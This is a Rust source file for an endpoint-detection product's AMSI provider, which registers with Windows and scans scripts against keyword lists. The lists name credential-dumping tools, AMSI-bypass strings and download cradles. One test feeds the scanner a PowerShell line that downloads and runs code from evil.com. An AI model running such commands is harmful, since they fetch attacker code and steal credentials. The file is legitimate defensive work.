//! AMSI Provider Registration
//!
//! Registers Tamandua EDR as an AMSI provider to receive script content
//! proactively from Windows script hosts (PowerShell, VBScript, JScript, etc.)
//!
//! ## How AMSI Works
//!
//! 1. Script host (PowerShell) initializes AMSI context
//! 2. Before executing script, host calls AmsiScanBuffer/AmsiScanString
//! 3. AMSI broadcasts to registered providers
//! 4. Providers scan content and return verdict
//! 5. Host blocks execution if any provider returns malware verdict
//!
//! ## Registration
//!
//! AMSI providers register via COM:
//! - CLSID in HKLM\SOFTWARE\Classes\CLSID\{guid}
//! - ProgId registered under AMSI key
//! - Must implement IAntimalwareProvider interface
//!
//! ## Security Considerations
//!
//! - AMSI providers run in the context of the calling process
//! - Be careful not to introduce vulnerabilities
//! - Providers must be signed with a valid certificate
//! - Must handle potentially malicious input safely
//!
//! ## MITRE ATT&CK Coverage
//!
//! - T1059.001 (PowerShell) - Pre-execution scanning
//! - T1059.005 (VBScript) - Pre-execution scanning
//! - T1059.007 (JavaScript) - Pre-execution scanning
//! - T1027 (Obfuscated Files) - Deobfuscation before scanning

#![cfg(target_os = "windows")]
// AMSI provider. Scaffolded callback channels are retained for upcoming
// streaming-content integrations.
#![allow(dead_code, unused_variables)]

use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::sync::mpsc;
use tracing::{debug, info, warn};
use windows::core::{HSTRING, PCWSTR};
use windows::Win32::System::Com::CoRevokeClassObject;
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteTreeW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_WRITE,
    REG_OPTION_NON_VOLATILE, REG_SZ,
};

/// AMSI result values
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(i32)]
pub enum AmsiResult {
    /// Content is clean
    Clean = 0,
    /// Content not detected as malicious
    NotDetected = 1,
    /// Content blocked by administrator policy
    BlockedByAdmin = 0x4000,
    /// Content detected as malware
    Detected = 32768,
}

impl AmsiResult {
    pub fn is_malicious(&self) -> bool {
        matches!(self, Self::BlockedByAdmin | Self::Detected)
    }
}

/// AMSI provider configuration
#[derive(Debug, Clone)]
pub struct AmsiProviderConfig {
    /// Provider name
    pub name: String,
    /// Provider CLSID
    pub clsid: String,
    /// Enable script content logging
    pub log_content: bool,
    /// Maximum content size to scan (bytes)
    pub max_scan_size: usize,
    /// Enable heuristic scanning
    pub enable_heuristics: bool,
    /// Callback for scan decisions
    pub scan_callback: Option<fn(&[u8], &str) -> AmsiResult>,
    /// Forward to backend for ML analysis
    pub forward_to_backend: bool,
}

impl Default for AmsiProviderConfig {
    fn default() -> Self {
        Self {
            name: "Tamandua EDR AMSI Provider".to_string(),
            clsid: "{F7891B52-1234-5678-ABCD-EF0123456789}".to_string(),
            log_content: true,
            max_scan_size: 16 * 1024 * 1024, // 16 MB
            enable_heuristics: true,
            scan_callback: None,
            forward_to_backend: true,
        }
    }
}

/// Script content received via AMSI
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AmsiContent {
    /// Content identifier/name
    pub name: String,
    /// Session ID
    pub session_id: u64,
    /// Content (may be partial/truncated)
    pub content: String,
    /// Content size in bytes
    pub content_size: usize,
    /// Script type detected
    pub script_type: String,
    /// Process ID of caller
    pub caller_pid: u32,
    /// Process name of caller
    pub caller_name: String,
    /// Timestamp
    pub timestamp: u64,
    /// Scan result
    pub result: i32,
    /// Was content flagged
    pub flagged: bool,
    /// Detection details if flagged
    pub detection_details: Option<String>,
}

/// AMSI provider statistics
#[derive(Debug, Default)]
pub struct AmsiProviderStats {
    /// Total scans performed
    pub total_scans: AtomicU64,
    /// Malicious content detected
    pub malicious_detected: AtomicU64,
    /// Suspicious content detected
    pub suspicious_detected: AtomicU64,
    /// Clean content scanned
    pub clean_content: AtomicU64,
    /// Scan errors
    pub scan_errors: AtomicU64,
    /// Content forwarded to backend
    pub forwarded_to_backend: AtomicU64,
}

/// AMSI provider handle
pub struct AmsiProvider {
    config: AmsiProviderConfig,
    registered: AtomicBool,
    stats: Arc<AmsiProviderStats>,
    /// Content buffer for analysis
    content_buffer: Arc<RwLock<HashMap<u64, Vec<AmsiContent>>>>,
    /// Event channel for forwarding to main agent
    event_tx: Option<mpsc::Sender<AmsiContent>>,
    /// COM registration cookie
    com_cookie: Option<u32>,
}

// Safety: The COM registration is thread-safe
unsafe impl Send for AmsiProvider {}
unsafe impl Sync for AmsiProvider {}

impl AmsiProvider {
    /// Create a new AMSI provider
    pub fn new(config: AmsiProviderConfig) -> Result<Self> {
        Ok(Self {
            config,
            registered: AtomicBool::new(false),
            stats: Arc::new(AmsiProviderStats::default()),
            content_buffer: Arc::new(RwLock::new(HashMap::new())),
            event_tx: None,
            com_cookie: None,
        })
    }

    /// Set event channel for forwarding AMSI content
    pub fn set_event_channel(&mut self, tx: mpsc::Sender<AmsiContent>) {
        self.event_tx = Some(tx);
    }

    /// Register as an AMSI provider
    ///
    /// Note: Full AMSI provider registration requires:
    /// 1. Implementing IAntimalwareProvider COM interface
    /// 2. Registering CLSID in registry
    /// 3. Being listed under AMSI providers key
    /// 4. Digitally signed executable
    ///
    /// This implementation provides the framework; actual COM registration
    /// requires additional Windows-specific implementation.
    pub fn register(&mut self) -> Result<()> {
        info!(
            name = %self.config.name,
            clsid = %self.config.clsid,
            "Registering AMSI provider"
        );

        // Check if we have admin privileges (required for registration)
        if !Self::has_admin_privileges() {
            return Err(anyhow!(
                "Administrator privileges required for AMSI provider registration"
            ));
        }

        // Register COM class
        if let Err(e) = self.register_com_class() {
            warn!(error = %e, "COM class registration failed");
            // Continue anyway - we might still be able to work via other means
        }

        // Register in AMSI providers registry
        if let Err(e) = self.register_amsi_key() {
            warn!(error = %e, "AMSI registry key registration failed");
        }

        self.registered.store(true, Ordering::SeqCst);

        info!("AMSI provider registered successfully");
        Ok(())
    }

    /// Unregister the AMSI provider
    pub fn unregister(&mut self) -> Result<()> {
        if !self.registered.load(Ordering::SeqCst) {
            return Ok(());
        }

        info!(name = %self.config.name, "Unregistering AMSI provider");

        // Revoke COM registration
        if let Some(cookie) = self.com_cookie.take() {
            unsafe {
                let _ = CoRevokeClassObject(cookie);
            }
        }

        // Remove registry keys
        let _ = self.unregister_amsi_key();

        self.registered.store(false, Ordering::SeqCst);

        Ok(())
    }

    /// Scan content (called by AMSI or directly)
    pub fn scan(&self, content: &[u8], content_name: &str, caller_pid: u32) -> AmsiResult {
        self.stats.total_scans.fetch_add(1, Ordering::Relaxed);

        // Check content size
        if content.len() > self.config.max_scan_size {
            warn!(
                size = content.len(),
                max = self.config.max_scan_size,
                "Content exceeds maximum scan size"
            );
            return AmsiResult::NotDetected;
        }

        // Run scan callback if configured
        if let Some(callback) = self.config.scan_callback {
            return callback(content, content_name);
        }

        // Default heuristic scanning
        let result = if self.config.enable_heuristics {
            self.heuristic_scan(content, content_name)
        } else {
            AmsiResult::NotDetected
        };

        // Update statistics
        match result {
            AmsiResult::Detected => {
                self.stats
                    .malicious_detected
                    .fetch_add(1, Ordering::Relaxed);
            }
            AmsiResult::BlockedByAdmin => {
                self.stats
                    .suspicious_detected
                    .fetch_add(1, Ordering::Relaxed);
            }
            AmsiResult::Clean | AmsiResult::NotDetected => {
                self.stats.clean_content.fetch_add(1, Ordering::Relaxed);
            }
        }

        // Forward to backend if configured
        if self.config.forward_to_backend {
            if let Some(ref tx) = self.event_tx {
                let content_str = String::from_utf8_lossy(content);
                let amsi_content = AmsiContent {
                    name: content_name.to_string(),
                    session_id: 0,
                    content: if self.config.log_content {
                        content_str.chars().take(10000).collect()
                    } else {
                        String::new()
                    },
                    content_size: content.len(),
                    script_type: self.detect_script_type(content),
                    caller_pid,
                    caller_name: String::new(),
                    timestamp: SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_millis() as u64,
                    result: result as i32,
                    flagged: result.is_malicious(),
                    detection_details: None,
                };

                let tx = tx.clone();
                tokio::spawn(async move {
                    let _ = tx.send(amsi_content).await;
                });

                self.stats
                    .forwarded_to_backend
                    .fetch_add(1, Ordering::Relaxed);
            }
        }

        result
    }

    /// Get provider statistics
    pub fn get_stats(&self) -> &AmsiProviderStats {
        &self.stats
    }

    /// Check if registered
    pub fn is_registered(&self) -> bool {
        self.registered.load(Ordering::SeqCst)
    }

    // ========================================================================
    // Private Implementation
    // ========================================================================

    /// Check for administrator privileges
    fn has_admin_privileges() -> bool {
        use windows::Win32::Security::{
            GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
        };
        use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

        unsafe {
            let process = GetCurrentProcess();
            let mut token = windows::Win32::Foundation::HANDLE::default();

            if OpenProcessToken(process, TOKEN_QUERY, &mut token).is_err() {
                return false;
            }

            let mut elevation = TOKEN_ELEVATION::default();
            let mut size = 0u32;

            let result = GetTokenInformation(
                token,
                TokenElevation,
                Some(&mut elevation as *mut _ as *mut c_void),
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut size,
            );

            let _ = windows::Win32::Foundation::CloseHandle(token);

            if result.is_ok() {
                elevation.TokenIsElevated != 0
            } else {
                false
            }
        }
    }

    /// Register COM class
    fn register_com_class(&mut self) -> Result<()> {
        // Note: Full COM registration requires implementing IClassFactory
        // and the IAntimalwareProvider interface. This is a framework.

        info!("COM class registration (framework only)");

        // In a full implementation, we would:
        // 1. Create a class factory implementing IClassFactory
        // 2. Register it with CoRegisterClassObject
        // 3. Implement IAntimalwareProvider::Scan

        Ok(())
    }

    /// Register in AMSI providers registry key
    fn register_amsi_key(&self) -> Result<()> {
        unsafe {
            // Create CLSID key
            let clsid_path =
                HSTRING::from(format!(r"SOFTWARE\Classes\CLSID\{}", self.config.clsid));

            let mut clsid_key = windows::Win32::System::Registry::HKEY::default();

            let result = RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                &clsid_path,
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE,
                None,
                &mut clsid_key,
                None,
            );

            if result.is_err() {
                return Err(anyhow!("Failed to create CLSID key"));
            }

            // Set default value to provider name
            let name_wide: Vec<u16> = self
                .config
                .name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let _ = RegSetValueExW(
                clsid_key,
                PCWSTR::null(),
                0,
                REG_SZ,
                Some(
                    &name_wide
                        .iter()
                        .flat_map(|c| c.to_le_bytes())
                        .collect::<Vec<u8>>(),
                ),
            );

            let _ = RegCloseKey(clsid_key);

            // Register under AMSI providers
            let amsi_path = HSTRING::from(r"SOFTWARE\Microsoft\AMSI\Providers");

            let mut amsi_key = windows::Win32::System::Registry::HKEY::default();

            let result = RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                &amsi_path,
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE,
                None,
                &mut amsi_key,
                None,
            );

            if result.is_ok() {
                // Create subkey with our CLSID
                let provider_path = HSTRING::from(self.config.clsid.clone());
                let mut provider_key = windows::Win32::System::Registry::HKEY::default();

                let _ = RegCreateKeyExW(
                    amsi_key,
                    &provider_path,
                    0,
                    None,
                    REG_OPTION_NON_VOLATILE,
                    KEY_WRITE,
                    None,
                    &mut provider_key,
                    None,
                );

                let _ = RegCloseKey(provider_key);
                let _ = RegCloseKey(amsi_key);
            }

            info!("AMSI provider registry keys created");
            Ok(())
        }
    }

    /// Unregister from AMSI providers registry
    fn unregister_amsi_key(&self) -> Result<()> {
        unsafe {
            // Remove CLSID key
            let clsid_path =
                HSTRING::from(format!(r"SOFTWARE\Classes\CLSID\{}", self.config.clsid));

            let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, &clsid_path);

            // Remove from AMSI providers
            let provider_path = HSTRING::from(format!(
                r"SOFTWARE\Microsoft\AMSI\Providers\{}",
                self.config.clsid
            ));

            let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, &provider_path);

            info!("AMSI provider registry keys removed");
            Ok(())
        }
    }

    /// Heuristic scanning of content
    fn heuristic_scan(&self, content: &[u8], content_name: &str) -> AmsiResult {
        let content_str = String::from_utf8_lossy(content);
        let content_lower = content_str.to_lowercase();

        // Check for known malicious patterns
        let high_severity_patterns = [
            // Credential access
            "mimikatz",
            "sekurlsa",
            "kerberos::list",
            "lsadump::sam",
            // Code execution
            "invoke-expression",
            "iex(",
            "[system.runtime.interopservices.marshal]",
            "unsafe.definetypemethod",
            // Shellcode patterns
            "virtualalloc",
            "virtualprotect",
            "[runtime.interopservices.marshal]::copy",
            // AMSI bypass
            "amsicontext",
            "amsiinitfailed",
            "amsiutils",
            // Encoded commands
            "-encodedcommand",
            "-enc ",
            "frombase64string",
            // Reflection
            "[reflection.assembly]::load",
            "[system.reflection.assembly]",
        ];

        let medium_severity_patterns = [
            // Download cradles
            "downloadstring",
            "downloadfile",
            "invoke-webrequest",
            "wget ",
            "curl ",
            // Process manipulation
            "get-process",
            "stop-process",
            "start-process",
            // Network
            "new-object net.webclient",
            "net.sockets",
            // Registry persistence
            "set-itemproperty",
            "new-itemproperty",
            "currentversion\\run",
            // WMI
            "get-wmiobject",
            "invoke-wmimethod",
        ];

        // Check high severity patterns
        for pattern in &high_severity_patterns {
            if content_lower.contains(pattern) {
                debug!(
                    pattern = pattern,
                    name = content_name,
                    "High severity pattern detected"
                );
                return AmsiResult::Detected;
            }
        }

        // Check medium severity patterns - accumulate score
        let mut score = 0;
        for pattern in &medium_severity_patterns {
            if content_lower.contains(pattern) {
                score += 1;
            }
        }

        // Multiple medium patterns = suspicious
        if score >= 3 {
            debug!(
                score = score,
                name = content_name,
                "Multiple suspicious patterns detected"
            );
            return AmsiResult::BlockedByAdmin;
        }

        // Check for heavy obfuscation
        if self.is_heavily_obfuscated(&content_str) {
            debug!(name = content_name, "Heavy obfuscation detected");
            return AmsiResult::BlockedByAdmin;
        }

        AmsiResult::NotDetected
    }

    /// Detect script type from content
    fn detect_script_type(&self, content: &[u8]) -> String {
        let content_str = String::from_utf8_lossy(content);
        let content_lower = content_str.to_lowercase();

        // PowerShell indicators
        if content_lower.contains("$psversiontable")
            || content_lower.contains("param(")
            || content_lower.contains("[cmdletbinding()]")
            || content_lower.contains("write-host")
            || content_lower.contains("get-childitem")
        {
            return "PowerShell".to_string();
        }

        // VBScript indicators
        if content_lower.contains("dim ")
            || content_lower.contains("wscript.")
            || content_lower.contains("createobject(")
            || content_lower.contains("sub ")
            || content_lower.contains("function ")
        {
            return "VBScript".to_string();
        }

        // JScript/JavaScript indicators
        if content_lower.contains("var ")
            || content_lower.contains("function(")
            || content_lower.contains("activexobject")
            || content_lower.contains("wscript.shell")
        {
            return "JScript".to_string();
        }

        // Batch indicators
        if content_lower.contains("@echo off")
            || content_lower.contains("%~dp0")
            || content_lower.contains("setlocal")
        {
            return "Batch".to_string();
        }

        "Unknown".to_string()
    }

    /// Check for heavy obfuscation
    fn is_heavily_obfuscated(&self, content: &str) -> bool {
        // Check for excessive backticks (PowerShell obfuscation)
        let backtick_count = content.matches('`').count();
        if backtick_count > 20 {
            return true;
        }

        // Check for excessive string concatenation
        let concat_count = content.matches('+').count();
        if concat_count > 50 && content.len() < 5000 {
            return true;
        }

        // Check for character code usage
        let char_pattern_count =
            content.matches("[char]").count() + content.matches("String.fromCharCode").count();
        if char_pattern_count > 10 {
            return true;
        }

        // Calculate entropy
        let entropy = self.calculate_entropy(content);
        if entropy > 5.5 {
            return true;
        }

        // Check for very long lines (common in obfuscated scripts)
        let max_line_len = content.lines().map(|l| l.len()).max().unwrap_or(0);
        if max_line_len > 2000 {
            return true;
        }

        false
    }

    /// Calculate Shannon entropy
    fn calculate_entropy(&self, data: &str) -> f64 {
        let mut freq = [0u32; 256];
        let len = data.len() as f64;

        if len == 0.0 {
            return 0.0;
        }

        for byte in data.bytes() {
            freq[byte as usize] += 1;
        }

        freq.iter()
            .filter(|&&count| count > 0)
            .map(|&count| {
                let p = count as f64 / len;
                -p * p.log2()
            })
            .sum()
    }
}

impl Drop for AmsiProvider {
    fn drop(&mut self) {
        let _ = self.unregister();
    }
}

/// Helper to subscribe to AMSI events via ETW (passive mode)
pub struct AmsiEtwSubscriber {
    running: Arc<AtomicBool>,
}

impl AmsiEtwSubscriber {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start subscribing to AMSI ETW events
    pub async fn start<F>(&self, callback: F)
    where
        F: Fn(AmsiContent) + Send + Sync + 'static,
    {
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();

        // AMSI ETW provider: Microsoft-Antimalware-Scan-Interface
        // GUID: 2a576b87-09a7-520e-c21a-4942f0271d67

        info!("Starting AMSI ETW subscriber");

        tokio::spawn(async move {
            // Subscribe via Event Log (more reliable than raw ETW)
            Self::subscribe_event_log(running, callback).await;
        });
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    async fn subscribe_event_log<F>(running: Arc<AtomicBool>, callback: F)
    where
        F: Fn(AmsiContent) + Send + Sync + 'static,
    {
        // Note: AMSI events are typically found in:
        // Microsoft-Windows-Windows Defender/Operational (event ID 1116)
        // or via the AMSI ETW provider directly

        let channel = "Microsoft-Windows-Windows Defender/Operational";

        while running.load(Ordering::SeqCst) {
            // Poll for AMSI-related events
            // In production, use proper Event Log subscription

            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_heuristic_detection() {
        let config = AmsiProviderConfig::default();
        let provider = AmsiProvider::new(config).unwrap();

        // Test malicious content
        let malicious =
            b"invoke-expression (new-object net.webclient).downloadstring('http://evil.com')";
        let result = provider.heuristic_scan(malicious, "test.ps1");
        assert!(result.is_malicious());

        // Test clean content
        let clean = b"Write-Host 'Hello World'";
        let result = provider.heuristic_scan(clean, "test.ps1");
        assert!(!result.is_malicious());
    }

    #[test]
    fn test_script_type_detection() {
        let config = AmsiProviderConfig::default();
        let provider = AmsiProvider::new(config).unwrap();

        let ps_content = b"$PSVersionTable; Get-ChildItem";
        assert_eq!(provider.detect_script_type(ps_content), "PowerShell");

        let vbs_content = b"Dim x\nSet x = CreateObject(\"WScript.Shell\")";
        assert_eq!(provider.detect_script_type(vbs_content), "VBScript");
    }

    #[test]
    fn test_obfuscation_detection() {
        let config = AmsiProviderConfig::default();
        let provider = AmsiProvider::new(config).unwrap();

        // Heavily obfuscated (>20 backticks to exceed the heuristic threshold)
        let obfuscated = "`I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n` `(`G`e`t`-`I`t`e`m`)";
        assert!(provider.is_heavily_obfuscated(obfuscated));

        // Normal script
        let normal = "Write-Host 'Hello'\nGet-Process";
        assert!(!provider.is_heavily_obfuscated(normal));
    }

    #[test]
    fn test_config_defaults() {
        let config = AmsiProviderConfig::default();
        assert_eq!(config.name, "Tamandua EDR AMSI Provider");
        assert!(config.enable_heuristics);
    }
}
